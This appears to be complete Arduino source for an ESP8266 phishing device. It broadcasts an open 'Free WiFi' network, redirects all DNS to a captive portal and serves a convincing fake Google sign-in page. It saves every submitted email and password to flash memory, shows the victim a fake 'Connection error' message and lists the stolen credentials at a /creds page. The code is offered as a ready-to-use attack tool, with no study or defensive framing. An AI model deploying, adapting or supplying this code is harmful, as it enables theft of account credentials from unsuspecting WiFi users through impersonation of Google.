// ESP8266 WiFi Captive Portal with Fake Google Login
// By 125K (github.com/125K)
// Remixed by Lorenzo (github.com/lorenzoprimi)
// LittleFS functionality by dsfifty

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// User configuration
#define SSID_NAME "Free WiFi"
#define POST_TITLE "Connection error"
#define POST_BODY "Internet seems to be offline."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

//function prototypes
void readData();
void writeData(String data);
void deleteData();

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String index() {
  String CSS = ":root {--bs-blue: #0d6efd;--bs-indigo: #6610f2;--bs-purple: #6f42c1;--bs-pink: #d63384;--bs-red: #dc3545;--bs-orange: #fd7e14;--bs-yellow: #ffc107;--bs-green: #198754;--bs-teal: #20c997;--bs-cyan: #0dcaf0;--bs-black: #000;--bs-white: #fff;--bs-gray: #6c757d;--bs-gray-dark: #343a40;--bs-gray-100: #f8f9fa;--bs-gray-200: #e9ecef;--bs-gray-300: #dee2e6;--bs-gray-400: #ced4da;--bs-gray-500: #adb5bd;--bs-gray-600: #6c757d;--bs-gray-700: #495057;--bs-gray-800: #343a40;--bs-gray-900: #212529;--bs-primary: #0d6efd;--bs-secondary: #6c757d;--bs-success: #198754;--bs-info: #0dcaf0;--bs-warning: #ffc107;--bs-danger: #dc3545;--bs-light: #f8f9fa;--bs-dark: #212529;--bs-primary-rgb: 13, 110, 253;--bs-secondary-rgb: 108, 117, 125;--bs-success-rgb: 25, 135, 84;--bs-info-rgb: 13, 202, 240;--bs-warning-rgb: 255, 193, 7;--bs-danger-rgb: 220, 53, 69;--bs-light-rgb: 248, 249, 250;--bs-dark-rgb: 33, 37, 41;--bs-white-rgb: 255, 255, 255;--bs-black-rgb: 0, 0, 0;--bs-body-color-rgb: 33, 37, 41;--bs-body-bg-rgb: 255, 255, 255;--bs-font-sans-serif: system-ui, -apple-system, \"Segoe UI\", Roboto, \"Helvetica Neue\", \"Noto Sans\", \"Liberation Sans\", Arial, sans-serif, \"Apple Color Emoji\", \"Segoe UI Emoji\", \"Segoe UI Symbol\", \"Noto Color Emoji\";--bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, \"Liberation Mono\", \"Courier New\", monospace;--bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));--bs-body-font-family: var(--bs-font-sans-serif);--bs-body-font-size: 1rem;--bs-body-font-weight: 400;--bs-body-line-height: 1.5;--bs-body-color: #212529;--bs-body-bg: #fff;--bs-border-width: 1px;--bs-border-style: solid;--bs-border-color: #dee2e6;--bs-border-color-translucent: rgba(0, 0, 0, 0.175);--bs-border-radius: 0.375rem;--bs-border-radius-sm: 0.25rem;--bs-border-radius-lg: 0.5rem;--bs-border-radius-xl: 1rem;--bs-border-radius-2xl: 2rem;--bs-border-radius-pill: 50rem;--bs-link-color: #0d6efd;--bs-link-hover-color: #0a58ca;--bs-code-color: #d63384;--bs-highlight-bg: #fff3cd;}*, *::before, *::after {box-sizing: border-box;}body {margin: 0;font-family: var(--bs-body-font-family);font-size: var(--bs-body-font-size);font-weight: var(--bs-body-font-weight);line-height: var(--bs-body-line-height);color: var(--bs-body-color);text-align: var(--bs-body-text-align);background-color: var(--bs-body-bg);-webkit-text-size-adjust: 100%;-webkit-tap-highlight-color: rgba(0, 0, 0, 0);}h6, .h6, h5, .h5, h4, .h4, h3, .h3, h2, .h2, h1, .h1 {margin-top: 0;margin-bottom: 0.5rem;font-weight: 500;line-height: 1.2;}h1, .h1 {font-size: calc(1.375rem + 1.5vw);}h2, .h2 {font-size: calc(1.325rem + 0.9vw);}p {margin-top: 0;margin-bottom: 1rem;}img, svg {vertical-align: middle;}button {border-radius: 0;}input, button, select, optgroup, textarea {margin: 0;font-family: inherit;font-size: inherit;line-height: inherit;}button, select {text-transform: none;}button, [type=button], [type=reset], [type=submit] {-webkit-appearance: button;}button:not(:disabled), [type=button]:not(:disabled), [type=reset]:not(:disabled), [type=submit]:not(:disabled) {cursor: pointer;}legend {float: left;width: 100%;padding: 0;margin-bottom: 0.5rem;font-size: calc(1.275rem + 0.3vw);line-height: inherit;}legend + * {clear: left;}@media only screen and (min-width: 768px) {.login-container {width: 436px !important;margin: auto !important;margin-top: 150px !important;height: 500px !important;}.login-content {padding-top: 30px !important;padding-bottom: 40px !important;}}html, body {width: 100%;height: 100%;}html, body {font-family: 'Roboto', sans-serif;}.login-container {margin-top: 0px;border: 1px solid rgb(217, 220, 222);border-radius: 8px;	height: 80%;	position: relative;}@media (max-width: 767px){  .login-container {border: 1px solid #fff;  }}.g-h1 {padding-top: 15px;}.g-h1, .g-h2 {text-align: center;font-size: 24px;}.g-h2 {font-size: 16px;}.g-input {border-radius: 4px;padding: 13px 15px;border: 1px solid rgb(218, 220, 222);width: 100%;font-weight: 400;height: 52px !important;}.g-input:focus {outline: none !important;border: 2px solid #1a73e8;transition-timing-function: ease;}.g-input-invalid {border: 1px solid red;}.g-input-invalid:focus {border: 2px solid red;}.login-content {padding-top: 24px;}.g-legend {font-weight: 600;font-size: 14px;color: #1a73e8;margin-top: 15px;	font-family: 'open-sans';	margin-left: 5px;}.p {font-size: 14px;color: #5f6368;margin-bottom: 0px;margin-left: 5px;}.login-priv {margin-top: 32px;}.login-priv .g-legend {margin-top: 0px !important;}.login-nav {margin-top: 32px;display: flex;}.gbtn-primary {min-width: 88px;line-height: 35px;text-align: center;border-radius: 4px;background-color: #1a73e8;	font-family: 'open-sans';  color: #fff;  border-style: solid;  font-size: 12px;  font-weight: 600;  letter-spacing: .25px;}.gbtn-primary:hover {background-color: #4285f4;transition: 0.2s;transition-delay: 0.1s;transition-timing-function: ease;}.gbtn-label {color: white;font-weight: 400;	font-family: 'open-sans';	font-size: 14px;	font-weight: bold;}#logo {margin: 0 auto;display: table;width: 75px;float: none;position: relative;}.login-content {padding: 10px;	padding-top: 20px;	height: 100%;}.progress-bar-container {min-height: 4px;}#login-app {	height: 100%;}.invalid-icon {margin-right: 8px;}.invalid-icon svg {fill: red;}.invalid-email-text-span {font-size: 12px;color: red;}.password-input {margin-top: 20px;}.g-input:required {	box-shadow: none;}.mdc-linear-progress {position: relative;width: 100%;height: 4px;-webkit-transform: translateZ(0);transform: translateZ(0);outline: 1px solid transparent;overflow: hidden;-webkit-transition: opacity 250ms 0s cubic-bezier(.4,0,.6,1);-o-transition: opacity 250ms 0s cubic-bezier(.4,0,.6,1);transition: opacity 250ms 0s cubic-bezier(.4,0,.6,1)}";
  String h = "<style>"+CSS+"</style>"
    "<!DOCTYPE html><html lang=\"en\" dir=\"ltr\"><head><meta charset=\"utf-8\"><title>Google Sign In:</title><link rel=\"stylesheet\" href=\"assets/css/custom2.css\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\" /></head><body><div id='login-app'><div class=\"login-container\"><!-- progress bar from material.io --><div class='progress-bar-container show-progress'><div class=\"progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden\" style='display:none;'><div class=\"mdc-linear-progress mdc-linear-progress--indeterminate\"><div class=\"mdc-linear-progress__buffering-dots\"></div><div class=\"mdc-linear-progress__buffer\"></div><div class=\"mdc-linear-progress__bar mdc-linear-progress__primary-bar\"><span class=\"mdc-linear-progress__bar-inner\"></span></div><div class=\"mdc-linear-progress__bar mdc-linear-progress__secondary-bar\"><span class=\"mdc-linear-progress__bar-inner\"></span></div></div></div></div><div class='login-content' id='login-form'><div id=\"logo\" title=\"Google\"><svg viewBox=\"0 0 75 24\" width=\"75\" height=\"24\" xmlns=\"http://www.w3.org/2000/svg\" aria-hidden=\"true\"><g id=\"qaEJec\"><path fill=\"#ea4335\" d=\"M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z\"></path></g><g id=\"YGlOvc\"><path fill=\"#34a853\" d=\"M58.193.67h2.564v17.44h-2.564z\"></path></g><g id=\"BWfIk\"><path fill=\"#4285f4\" d=\"M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z\"></path></g><g id=\"e6m3fd\"><path fill=\"#fbbc05\" d=\"M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z\"></path></g><g id=\"vbkDmc\"><path fill=\"#ea4335\" d=\"M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z\"></path></g><g id=\"idEJde\"><path fill=\"#4285f4\" d=\"M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z\"></path></g></svg></div><form method=\"POST\" action=\"/post\" id='email-form-step'><h1 class='g-h1'>Sign in</h1><h2 class='g-h2'>Use your Google Account</h2><div class='login-content'><input name=\"email\" id='email-input' type=\"text\" class='g-input' placeholder=\"Email or phone\" required><input name=\"password\" id='password-input' type=\"password\" class='g-input password-input' placeholder=\"Password\" required><legend class='g-legend'>Forgot email?</legend><div class='login-priv'><p class='p'>Not your computer? Use a Private Window to sign in.</p><legend class='g-legend'>Learn more</legend></div><div class='login-nav'><legend class='g-legend'>Create Account</legend><button class='gbtn-primary' type=\"submit\">Next</button></div></div></form></div></div></div></body></html>";
  return h; }

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }";
  String h = "<!DOCTYPE html><html>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><div><h1>"+t+"</h1></div><div>";
  return h; }

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>";
}

String posted() {
  String email=input("email");
  String password=input("password");
  readData();  //retrieves saved data and adds the new data. The data variable is updated and saved again to LittleFS
  Credentials = data + "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header(POST_TITLE) + POST_BODY;
}

String clear() {
  String email="<p></p>";
  String password="<p></p>";
  Credentials="<p></p>";
  data = "";
  savedData = 0;
  deleteData();  //deletes the file from LittleFS
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>";
}

void BLINK() {  // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

void readData()  //reads the file from LittleFS and returns as the string variable called: data
{
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "r");
  //Check if the file exists
  if (!file) {
    return;
  }
  data = "";  //setup for data read
  int i = 0;
  char myArray[1000];
  while (file.available()) {

    myArray[i] = (file.read());  //file is read one character at a time into the char array
    i++;
  }
  myArray[i] = '\0';  //a null is added at the end
  //Close the file
  file.close();
  data = String(myArray);  //convert the array into a string ready for return
  if (data != ""){
    savedData=1;
  }
}

void writeData(String data) {
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "w");
  //Write to the file
  file.print(data);
  delay(1);
  //Close the file
  file.close();
}

void deleteData() {
  //Remove the file
  LittleFS.remove("/SavedFile.txt");
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  //LittleFS set up
  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    delay(1000);
    return;
  }
  //Read the saved data every boot
  readData();

}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}